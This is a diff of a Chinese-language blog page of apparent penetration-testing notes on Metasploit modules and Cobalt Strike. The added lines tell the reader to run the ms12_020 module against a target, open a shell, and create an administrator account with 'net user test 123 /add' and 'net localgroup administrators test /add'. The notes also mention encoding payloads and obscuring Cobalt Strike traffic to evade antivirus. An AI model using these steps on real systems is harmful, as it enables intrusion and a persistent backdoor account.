@@ -182,13 +182,13 @@
 <p>kali已经自带了。</p>
 <h3 id="2-运行环境-1"><a href="#2-运行环境-1" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>kali</p>
 <h3 id="3-功能模块"><a href="#3-功能模块" class="headerlink" title="3.功能模块"></a>3.功能模块</h3><ol>
-<li><p>Auxiliary（辅助模块）：为渗透测试信息搜集提供了大量的辅助模块支持</p>
+<li><p>Auxiliary（辅助模块）：**(扫描、嗅探、指纹识别)**</p>
 </li>
-<li><p>Exploits（攻击模块）：利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</p>
+<li><p>Exploits（攻击模块）：利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。**(Poc验证)**</p>
 </li>
 <li><p>Payload（攻击载荷模块）：攻击成功后促使靶机运行的一段植入代码</p>
 </li>
-<li><p>Post （后渗透攻击模块）：收集更多信息或进一步访问被利用的目标系统</p>
+<li><p>Post （后渗透攻击模块）：<strong>获取远程控制权后，收集更多信息或进一步访问被利用的目标系统</strong></p>
 </li>
 <li><p>Encoders（编码模块）:负责免杀,将攻击载荷进行编码，来绕过防护软件拦截</p>
 <p>● 扫描目标机系统，寻找可用漏洞。</p>
@@ -211,7 +211,10 @@
 <p>一般需要配置rhosts，<code>set rhosts 目标ip</code>后</p>
 <p>输入run运行即可</p>
 <p>会显示The target is vulnerable，证明该主机漏洞存在</p>
-<h5 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2)攻击"></a>2)攻击</h5><p><strong>serch ms12_020-&gt;use 0-&gt;show options-&gt;set rhosts 目标ip-&gt;run</strong>即可</p>
+<h5 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2)攻击"></a>2)攻击</h5><p><strong>serch ms12_020-&gt;use 0-&gt;show options-&gt;set rhosts 目标ip-&gt;run</strong></p>
+<p>msf输入shell可进入靶机机器，可以添加用户，并将其设为管理员组</p>
+<p><code>net user test 123 /add</code></p>
+<p><code>net localgroup administrators test /add</code></p>
 <h2 id="三、cobalt-strike"><a href="#三、cobalt-strike" class="headerlink" title="三、cobalt strike"></a>三、cobalt strike</h2><h3 id="1-cs是什么"><a href="#1-cs是什么" class="headerlink" title="1.cs是什么"></a>1.cs是什么</h3><p>渗透测试神器，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。</p>
 <p>本质是c2（command&amp;control），类似于teamserver发布命令，client执行命令，远控</p>
 <h3 id="2-运行环境-2"><a href="#2-运行环境-2" class="headerlink" title="2.运行环境"></a>2.运行环境</h3><p>一般是kali启动teamserver服务（有java的linux平台），主机运行客户端（java环境）。客户端所填的ip地址就是kali的地址。正常实战时，cs隐藏特征和流量混淆一下，免杀。</p>
